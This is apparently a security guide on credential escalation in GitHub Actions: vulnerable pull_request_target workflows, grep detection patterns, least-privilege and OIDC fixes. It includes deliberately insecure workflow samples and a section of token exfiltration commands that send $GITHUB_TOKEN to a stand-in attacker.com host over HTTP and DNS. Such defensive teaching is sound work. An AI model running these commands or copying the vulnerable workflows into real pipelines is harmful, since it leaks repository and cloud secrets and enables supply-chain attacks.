# Credential Escalation

## Overview

GitHub Actions workflows have access to credentials (GITHUB_TOKEN, PATs, deploy keys, cloud credentials) that vary in scope and blast radius. When untrusted code can access these credentials — via pwn requests, expression injection, or missing permission boundaries — attackers can escalate from "open a PR" to "own the repository."

---

## Credential Types and Blast Radius

| Credential | Default Scope | Blast Radius if Stolen |
|------------|---------------|----------------------|
| `GITHUB_TOKEN` (read) | Read repo contents | Clone private repo code |
| `GITHUB_TOKEN` (write) | Read/write contents, PRs, issues | Push commits, merge PRs, modify releases |
| Personal Access Token (classic) | Depends on scopes, resource access, SSO and policies | Impact is limited to effective token permissions, potentially across repos |
| Fine-grained PAT | Specified repos/permissions | Scoped but still persistent access |
| Deploy key (read) | Single repo read | Clone single repo |
| Deploy key (write) | Single repo read/write | Push to single repo, modify contents |
| Cloud credentials (AWS/GCP/Azure) | Depends on IAM role | Cloud resource access, data exfiltration |
| npm/PyPI tokens | Publish packages | Supply chain attack on downstream users |

---

## The Vulnerability

### PAT in pull_request_target Workflow

```yaml
# VULNERABLE: PAT accessible to fork code
on: pull_request_target
jobs:
  auto-merge:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
          token: ${{ secrets.AUTO_COMMIT_PAT }}  # Classic PAT!
      - run: ./scripts/auto-format.sh  # Fork code has access to PAT
```

**Real-world:** Used against trivy (25k+ stars). The `AUTO_COMMIT_PAT` classic PAT was stolen and used to:
- Rename the repository and make it private
- Delete all GitHub Releases (versions 0.27.0 through 0.69.1)
- Push malicious artifact to the VSCode extension marketplace
- Push vandalism commit to main branch

### GITHUB_TOKEN with Excessive Permissions

```yaml
# VULNERABLE: write-all permissions with fork checkout
on: pull_request_target
permissions: write-all  # Everything writable
jobs:
  process:
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm install  # Fork's package.json can steal GITHUB_TOKEN
```

### Secrets Exposed via Environment

```yaml
# VULNERABLE: All secrets available to fork code
on: pull_request_target
jobs:
  deploy:
    runs-on: ubuntu-latest
    env:
      AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
      AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
      NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.ref }}
      - run: npm publish  # Fork code can read all env vars
```

---

## Detection Patterns

```bash
# Find workflows using secrets
grep -rn 'secrets\.' .github/workflows/ | grep -v 'GITHUB_TOKEN'

# Find PAT usage
grep -rn 'PAT\|_TOKEN\|_KEY\|_SECRET\|DEPLOY_KEY' .github/workflows/

# Find workflows with write-all or broad permissions
grep -rn 'write-all\|permissions:' .github/workflows/

# Check if secrets are in pull_request_target workflows
grep -B20 'secrets\.' .github/workflows/*.yml | grep 'pull_request_target'

# Find checkout steps with custom tokens
grep -A5 'actions/checkout' .github/workflows/*.yml | grep 'token:'
```

---

## The Fix: Minimal Permissions and Credential Isolation

### Principle of Least Privilege

```yaml
# SAFE: Explicit minimal permissions
on: pull_request
permissions:
  contents: read
  pull-requests: read
jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm run lint
```

### Separate Trusted and Untrusted Workflows

Never give PATs or write permissions to workflows that execute fork code:

```yaml
# Workflow 1: Build (no secrets, fork code OK)
on: pull_request
permissions:
  contents: read
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm test

# Workflow 2: Release (secrets OK, no fork code)
on:
  push:
    tags: ['v*']
permissions:
  contents: write
jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4  # Only target repo code
      - env:
          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
        run: npm publish
```

### Use Fine-Grained PATs Instead of Classic

| Feature | Classic PAT | Fine-Grained PAT |
|---------|-------------|-------------------|
| Repository scope | All repos or all public | Specific repos |
| Permission granularity | Broad scopes | Per-permission |
| Expiration | Depends on token/org policy | Depends on selected expiry and org policy |
| Org approval | No | Optional |
| IP allowlisting | Organization/policy dependent | Organization/policy dependent |

### Use OIDC Instead of Long-Lived Cloud Credentials

```yaml
# VULNERABLE: Long-lived AWS credentials
env:
  AWS_ACCESS_KEY_ID: ${{ secrets.AWS_KEY }}
  AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET }}

# OIDC avoids long-lived stored keys; validate issuer/audience/subject and environment policy
permissions:
  id-token: write
  contents: read
steps:
  - uses: aws-actions/configure-aws-credentials@v4
    with:
      role-to-assume: arn:aws:iam::123456789:role/github-actions
      aws-region: us-east-1
```

---

## Token Exfiltration Techniques

Attackers extract credentials via:

```bash
# Direct HTTP exfiltration
curl -d "token=$GITHUB_TOKEN" https://attacker.com/collect

# DNS exfiltration (requires permitted DNS resolution; not a universal egress bypass)
dig $(echo $GITHUB_TOKEN | base64).attacker.com

# Via workflow logs (if token not masked)
echo $SECRET_VALUE  # GitHub masks known secrets, but derived values may leak

# Via artifacts
echo $GITHUB_TOKEN > token.txt
# Upload as artifact
```

---

## Exploitation Scenario Template

```
ATTACK: Credential Escalation via [vector]
ENTRY: [How attacker triggers the workflow]
CREDENTIAL: [Which credential is accessible — PAT, GITHUB_TOKEN, cloud key]
SCOPE: [What the credential can do — write to repo, publish packages, etc.]
EXFILTRATION: [How the attacker extracts the credential]
POST-EXPLOITATION: [What attacker does with the credential]
IMPACT: [Full blast radius]
```

---

## References

- [GitHub Docs: Automatic token authentication](https://docs.github.com/en/actions/security-for-github-actions/security-guides/automatic-token-authentication)
- [GitHub Docs: Using fine-grained PATs](https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/managing-your-personal-access-tokens)
- [HackerBot Claw — trivy PAT theft and full repo compromise](https://www.stepsecurity.io/blog/hackerbot-claw-github-actions-exploitation)
